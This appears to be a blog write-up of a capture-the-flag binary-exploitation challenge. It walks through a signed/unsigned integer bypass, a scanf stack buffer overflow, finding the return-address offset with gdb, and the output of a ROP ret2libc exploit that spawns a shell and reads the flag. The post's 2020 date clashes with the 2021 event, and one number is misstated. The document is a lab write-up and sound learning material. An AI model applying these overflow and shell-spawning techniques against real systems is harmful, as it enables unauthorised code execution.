---
layout: post
title: "HackTheBox Cyber Apocalypse 2021: Controller Writeup"
date: 2020-05-15 11:30
tags: [pwn, pwntools, binary, rop]
---

This is a writeup of my first ROP challenge, from the HackTheBox Cyber Apocalypse 2021 CTF. We're given the following info about the challenge:

> The extraterrestrials have a special controller in order to manage and use our resources wisely, in order to produce state of the art technology gadgets and weapons for them. If we gain access to the controller's server, we can make them drain the minimum amount of resources or even stop them completeley. Take action fast!

We're given a zip to download, which contains the `controller` binary and the (presumably) target libc: `libc.so.6`. We're also given an IP & port to connect to which is running the same binary.

First, we check out what we're up against.

```bash
root@319c06cdfb09:/opt# file controller
controller: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e5746004163bf77994992a4c4e3c04565a7ad5d6, not stripped
root@319c06cdfb09:/opt# checksec controller
[*] '/opt/controller'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

We're up against a 64 bit ELF that isn't stripped. We can also see that the stack isn't executable, however stack canaries and PIE have been disabled. Loading the binary into Ghidra, we find the main function, which prints some stuff and then calls calculator.

```c
undefined8 main(void)

{
  setvbuf(stdout,(char *)0x0,2,0);
  welcome();
  calculator();
  return 0;
}
```

The calculator function appears to run forever, unless the result of `calc()` is 0xff3a, or 65538.

```c
void calculator(void)

{
  char local_28 [28];
  int local_c;
  
  local_c = calc();
  if (local_c == 0xff3a) {
    printstr("Something odd happened!\nDo you want to report the problem?\n> ");
    __isoc99_scanf(&DAT_004013e6,local_28);
    if ((local_28[0] == 'y') || (local_28[0] == 'Y')) {
      printstr("Problem reported!\n");
    }
    else {
      printstr("Problem ingored\n");
    }
  }
  else {
    calculator();
  }
  return;
}
```

If the result of the calculation **is** 65538, we read an unbounded amount of data into a buffer of length 28 with `scanf`. This allows us to perform a classic buffer overflow! So our first objective is to reach this buffer overflow. Having a look at what `calc()` does, we see that it performs a calculation and returns the result. Simple enough.

```
uint calc(void)

{
  ushort uVar1;
  float fVar2;
  uint local_18;
  uint local_14;
  int local_10;
  uint local_c;
  
  printstr("Insert the amount of 2 different types of recources: ");
  __isoc99_scanf("%d %d",&local_14,&local_18);
  local_10 = menu();
  if ((0x45 < (int)local_14) || (0x45 < (int)local_18)) {
    printstr("We cannot use these many resources at once!\n");
                    /* WARNING: Subroutine does not return */
    exit(0x69);
  }
  if (local_10 == 2) {
    local_c = sub(local_14,local_18,local_18);
    printf("%d - %d = %d\n",(ulong)local_14,(ulong)local_18,(ulong)local_c);
    return local_c;
  }
  if (local_10 < 3) {
    if (local_10 == 1) {
      local_c = add(local_14,local_18,local_18);
      printf("%d + %d = %d\n",(ulong)local_14,(ulong)local_18,(ulong)local_c);
      return local_c;
    }
  }
  else {
    if (local_10 == 3) {
      uVar1 = mult(local_14,local_18,local_18);
      local_c = (uint)uVar1;
      printf("%d * %d = %d\n",(ulong)local_14,(ulong)local_18,(ulong)local_c);
      return local_c;
    }
    if (local_10 == 4) {
      fVar2 = (float)divi(local_14,local_18,local_18);
      local_c = (uint)(long)fVar2;
      printf("%d / %d = %d\n",(ulong)local_14,(ulong)local_18,(long)fVar2 & 0xffffffff);
      return local_c;
    }
  }
  printstr("Invalid operation, exiting..\n");
  return local_c;
}
```

Unfortunately, we can't simply do `65338 * 1` due to the following snippet:

```c
if ((0x45 < (int)local_14) || (0x45 < (int)local_18)) {
  printstr("We cannot use these many resources at once!\n");
                  /* WARNING: Subroutine does not return */
  exit(0x69);
}
```

This means each input when casted to an integer must be less than 0x45 or 69 (nice). This can be bypassed in one of two ways

1. Do arithmetic with negative numbers e.g. `-65338 * -1` (simple, but boring)
2. Abuse the fact that unsigned integers are cast to integers for the comparison (much cooler)

Since unsigned integers are cast to integers, we can enter in near max integer values and abuse the fact the most significant bit will make the number negative when cast to an integer. For example, `4294967295 - 4294901957` where `4294901957 = 4294967295 - 65338` and `4294967295` is the max unsigned integer.

Now that we know how to get to the branch in theory, we should try it out.

```
root@f3a1d068b43d:/opt# ./controller

👾 Control Room 👾

Insert the amount of 2 different types of recources: 4294967295
4294901957
Choose operation:

1. ➕

2. ➖

3. ❌

4. ➗

> 2
-1 - -65339 = 65338
Something odd happened!
Do you want to report the problem?
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Problem ingored
Segmentation fault
```

Awesome! We have a segfault. I used `pwn cyclic` & `gdb` to identify the offset to our controlled RIP register.

```
root@f3a1d068b43d:/opt# gdb -q controller
Reading symbols from controller...
(No debugging symbols found in controller)
(gdb) disass calculator
Dump of assembler code for function calculator:
   0x0000000000401066 <+0>:	push   %rbp
   0x0000000000401067 <+1>:	mov    %rsp,%rbp
   0x000000000040106a <+4>:	sub    $0x20,%rsp
   0x000000000040106e <+8>:	callq  0x400f01 <calc>
   0x0000000000401073 <+13>:	mov    %eax,-0x4(%rbp)
   0x0000000000401076 <+16>:	cmpl   $0xff3a,-0x4(%rbp)
   0x000000000040107d <+23>:	jne    0x4010f1 <calculator+139>
   0x000000000040107f <+25>:	lea    0x322(%rip),%rdi        # 0x4013a8
   0x0000000000401086 <+32>:	callq  0x400dcd <printstr>
   0x000000000040108b <+37>:	lea    -0x20(%rbp),%rax
   0x000000000040108f <+41>:	mov    %rax,%rsi
   0x0000000000401092 <+44>:	lea    0x34d(%rip),%rdi        # 0x4013e6
   0x0000000000401099 <+51>:	mov    $0x0,%eax
   0x000000000040109e <+56>:	callq  0x400680 <__isoc99_scanf@plt>
   0x00000000004010a3 <+61>:	movzbl -0x20(%rbp),%edx
   0x00000000004010a7 <+65>:	movzbl 0x33b(%rip),%eax        # 0x4013e9
   0x00000000004010ae <+72>:	movzbl %dl,%edx
   0x00000000004010b1 <+75>:	movzbl %al,%eax
   0x00000000004010b4 <+78>:	sub    %eax,%edx
   0x00000000004010b6 <+80>:	mov    %edx,%eax
   0x00000000004010b8 <+82>:	test   %eax,%eax
   0x00000000004010ba <+84>:	je     0x4010d5 <calculator+111>
   0x00000000004010bc <+86>:	movzbl -0x20(%rbp),%edx
   0x00000000004010c0 <+90>:	movzbl 0x324(%rip),%eax        # 0x4013eb
   0x00000000004010c7 <+97>:	movzbl %dl,%edx
   0x00000000004010ca <+100>:	movzbl %al,%eax
   0x00000000004010cd <+103>:	sub    %eax,%edx
   0x00000000004010cf <+105>:	mov    %edx,%eax
   0x00000000004010d1 <+107>:	test   %eax,%eax
   0x00000000004010d3 <+109>:	jne    0x4010e3 <calculator+125>
   0x00000000004010d5 <+111>:	lea    0x311(%rip),%rdi        # 0x4013ed
   0x00000000004010dc <+118>:	callq  0x400dcd <printstr>
   0x00000000004010e1 <+123>:	jmp    0x4010fb <calculator+149>
   0x00000000004010e3 <+125>:	lea    0x316(%rip),%rdi        # 0x401400
   0x00000000004010ea <+132>:	callq  0x400dcd <printstr>
   0x00000000004010ef <+137>:	jmp    0x4010fb <calculator+149>
   0x00000000004010f1 <+139>:	mov    $0x0,%eax
   0x00000000004010f6 <+144>:	callq  0x401066 <calculator>
   0x00000000004010fb <+149>:	nop
   0x00000000004010fc <+150>:	leaveq
   0x00000000004010fd <+151>:	retq
End of assembler dump.
(gdb) b *calculator+61
Breakpoint 1 at 0x4010a3
(gdb) !pwn cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
(gdb) r
Starting program: /opt/controller
warning: Error disabling address space randomization: Operation not permitted

👾 Control Room 👾

Insert the amount of 2 different types of recources: 4294967295
4294901957
Choose operation:

1. ➕

2. ➖

3. ❌

4. ➗

> 2
-1 - -65339 = 65338
Something odd happened!
Do you want to report the problem?
> aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

Breakpoint 1, 0x00000000004010a3 in calculator ()
(gdb) info frame
Stack level 0, frame at 0x7ffe07be35c0:
 rip = 0x4010a3 in calculator; saved rip = 0x6161616c6161616b
 called by frame at 0x7ffe07be35c8
 Arglist at 0x7ffe07be35b0, args:
 Locals at 0x7ffe07be35b0, Previous frame's sp is 0x7ffe07be35c0
 Saved registers:
  rbp at 0x7ffe07be35b0, rip at 0x7ffe07be35b8
(gdb) !pwn cyclic -l 0x6161616b
40
```

Awesome, so we now know we controll the RIP regsiter 40 bytes into our payload

```bash
root@f3a1d068b43d:/opt# python3 sol.py
[*] '/opt/controller'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/opt/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 138.68.147.93 on port 31790: Done
[*] Loaded 14 cached gadgets for 'controller'
[*] puts found at 0x7f083c014aa0
[*] libc base found at 0x7f083bf94000
[*] Loaded 199 cached gadgets for 'libc.so.6'
[*] Switching to interactive mode
Problem ingored
$ id
uid=999(ctf) gid=999(ctf) groups=999(ctf)
$ ls
controller  flag.txt  libc.so.6
$ cat flag.txt
CHTB{1nt3g3r_0v3rfl0w_s4v3d_0ur_r3s0urc3s}
```